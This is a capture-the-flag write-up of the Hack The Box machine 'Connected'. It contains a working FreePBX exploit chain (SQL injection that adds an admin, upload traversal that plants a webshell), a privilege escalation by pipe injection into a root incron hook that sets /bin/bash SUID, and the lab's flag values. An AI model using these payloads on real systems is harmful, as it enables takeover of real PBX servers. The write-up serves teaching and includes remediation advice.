# Hack The Box — Connected

- **Target:** 10.129.245.100 (`connected.htb`)
- **OS:** Sangoma Linux 7.8 (CentOS 7)
- **Difficulty:** Easy
- **Date:** 2026-07-04
- **Result:** Rooted 🚩

| Flag | Value |
|------|-------|
| user.txt | `3e44b40ed3b56c9463b183dcb7d4708a` |
| root.txt | `78c56c15caa37f650f412744977f061e` |

---

## Key facts (quick reference)

| # | Fact | Value |
|---|------|-------|
| 1 | How many TCP ports are open? | **3** (22, 80, 443) |
| 2 | Web application on 80/443 | FreePBX **16.0.40.7** (Sangoma) |
| 3 | Virtual host | `connected.htb` |
| 4 | Foothold vulnerability | CVE-2025-57819 + CVE-2025-61678 (unauth SQLi → auth bypass → file-upload RCE) |
| 5 | Foothold user | `asterisk` (uid 999) |
| 6 | Privesc vector | incron → `sysadmin_manager` argument injection |
| 7 | Injection primitive | pipe `\|` (not in the params blacklist) via the `.CONTENTS` channel |

---

## 1. Enumeration

### Port scan

```bash
nmap -Pn -sV -sC -p- --min-rate 3000 10.129.245.100
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

Three ports. `http://10.129.245.100/` `301`-redirects to `http://connected.htb/`, so the
name goes in `/etc/hosts`:

```bash
echo "10.129.245.100 connected.htb" | sudo tee -a /etc/hosts
```

The 443 certificate CN is `pbxconnect`, `robots.txt` disallows `/`, and requests resolve to
`config.php` — the signature of a **FreePBX** install.

### Fingerprint

`connected.htb/` redirects `/` → `/admin`, landing on the FreePBX Administration login:

```bash
curl -s -H "Host: connected.htb" http://10.129.245.100/admin/ | grep -io 'version=[0-9.]*' | head -1
# version=16.0.40.7
```

**FreePBX 16.0.40.7.** With the commercial Endpoint Manager module, this version is
vulnerable to a pre-auth RCE chain disclosed and exploited in the wild in August 2025.

---

## 2. Foothold — CVE-2025-57819 + CVE-2025-61678 (RCE as `asterisk`)

Two chained bugs in the Endpoint Manager module:

- **CVE-2025-57819** (CVSS 9.8) — *unauthenticated stacked SQL injection* through the
  `brand` parameter of the endpoint module loader. A stacked `INSERT` drops a brand-new
  admin straight into `asterisk.ampusers`:

  ```
  GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&brand=<payload>
  ```
  ```sql
  x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections)
      VALUES (0x..., 0x<sha1(pw)>, 0x2a)-- -
  ```

- **CVE-2025-61678** — *authenticated arbitrary file upload* (path traversal) via the
  firmware uploader's `fwbrand` parameter
  (`/admin/ajax.php?module=endpoint&command=upload_cust_fw`). Setting
  `fwbrand=../../../var/www/html/<dir>` drops a PHP webshell into the web root.

Login as the injected admin → upload the shell → execute:

```bash
# public PoC: github.com/0xEhab/FreePBX-CVE-2025-57819-RCE
python3 exploit.py --rhost connected.htb --http --rport 80 --command "id"
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

```bash
python3 exploit.py --rhost connected.htb --http --rport 80 --command "cat /home/asterisk/user.txt"
# 3e44b40ed3b56c9463b183dcb7d4708a
```

**User flag captured.**

> **Takeaway:** an internet-reachable PBX admin panel on an outdated FreePBX is a full
> pre-auth takeover. Fingerprint the exact module version — the SQLi lives in the
> *commercial* Endpoint Manager, not core.

---

## 3. Privilege Escalation — incron argument injection into `sysadmin_manager`

### Dead ends first

- `pkexec` is `polkit-0.112-26.el7_9.1`, binary dated **2022-01-25** — the PwnKit
  (CVE-2021-4034) *patch*. Not vulnerable.
- `staprun` is SUID `root:stapusr`, mode `---s--x---`; `asterisk` isn't in `stapusr`.
- Kernel `5.4.239` — outside DirtyPipe's range.
- `aiovega` (custom **root** service on `127.0.0.1:4000`) exposes `/v1/shell/run`, but its
  transports (`telnet`/`ssh`/`serial`) only connect **outbound** to a remote Vega — no
  local command execution.

### The vector

`incrond` runs as **root** and watches, among others:

```
/var/spool/asterisk/incron  IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
```

`$#` expands to the changed file's name, so writing a file there runs
`sysadmin_manager <filename>` as root. `sysadmin_manager` (world-readable PHP) parses the
name as `module.hook.params`, validates the hook, then runs it:

```php
$verify = $g->checkSig($sigfile);                                   // GPG-verify module.sig
if (!isset($whitelist[$verify['config']['signedwith']])) exit;      // trusted key?
if (hash_file('sha256',$hookfile) !== $verify['hashes']["hooks/$hook"]) exit;  // hook untampered?
...
if (preg_match('/[^\x20-\x7e]/', $params)) exit;                    // printable ASCII only
if (preg_match('/[`\'"$><&;]/', $params)) exit;                       // blocks  ` ' " $ > < & ;
system("$hookfile $params");                                        // hook run as ROOT, params appended
```

Editing a hook is dead (breaks the signed sha256; `module.sig` is GPG-signed). **But the
params are the weakness.** The blacklist omits the **pipe `|`** (and space, `/`, `-`, `+`),
and naming the trigger `module.hook.CONTENTS` makes `$params` come from the trigger file's
*contents* instead of its name — sidestepping the "no `/` in a filename" limit:

```php
if ($parts[3] === "CONTENTS") { $params = fread($fh, 4096); }
```

### Exploit

Use the **unmodified, still-signed** `ucp/logrotate` hook (so `checkSig` and the sha256
both pass) and inject a pipe through the CONTENTS channel — no trailing newline (`\n` is
non-printable and trips the filter):

```bash
python3 exploit.py --rhost connected.htb --http --rport 80 --command \
  "printf 'x | chmod u+s /bin/bash' > /var/spool/asterisk/incron/ucp.logrotate.CONTENTS"
```

Root then runs `system(".../ucp/hooks/logrotate x | chmod u+s /bin/bash")`, making
`/bin/bash` SUID root. Reap:

```bash
python3 exploit.py --rhost connected.htb --http --rport 80 --command \
  "/bin/bash -p -c 'id; cat /root/root.txt'"
# uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
# 78c56c15caa37f650f412744977f061e
```

**Root flag captured.**

> **Why it works:** `sysadmin_manager` carefully verifies the *hook file's* integrity
> (GPG + sha256) but then interpolates attacker-controlled *params* into a shell string.
> A character blacklist that forgets `|` is not a boundary. The fix is `escapeshellarg` /
> an argv array, not a bigger blacklist.

---

## 4. Remediation

- **FreePBX:** upgrade the Endpoint Manager module (FreePBX 16 → Endpoint ≥ 16.0.89) to
  close CVE-2025-57819 / CVE-2025-61678; keep `/admin` off the public internet.
- **`sysadmin_manager`:** pass hook params as an argv array (`proc_open` /
  `escapeshellarg`) instead of interpolating into `system()`; replace the character
  blacklist with a strict allowlist. The `|` omission plus the `CONTENTS` file-body
  channel defeats the current filter.
- **Least privilege:** the web user (`asterisk`) should not be able to write files that a
  root `incron` watcher then executes against.

---

## Attack chain summary

```
nmap  3 ports → 22 / 80 / 443
  └─ :80 → connected.htb → /admin  =  FreePBX 16.0.40.7
       └─ CVE-2025-57819  unauth SQLi → INSERT admin into ampusers
            └─ CVE-2025-61678  firmware upload path-traversal → PHP webshell
                 └─ RCE as asterisk → user.txt
                      └─ root incron watches /var/spool/asterisk/incron
                           └─ sysadmin_manager: system("$hook $params"), '|' not filtered
                                └─ ucp.logrotate.CONTENTS = "x | chmod u+s /bin/bash"
                                     └─ /bin/bash -p → root → root.txt
```
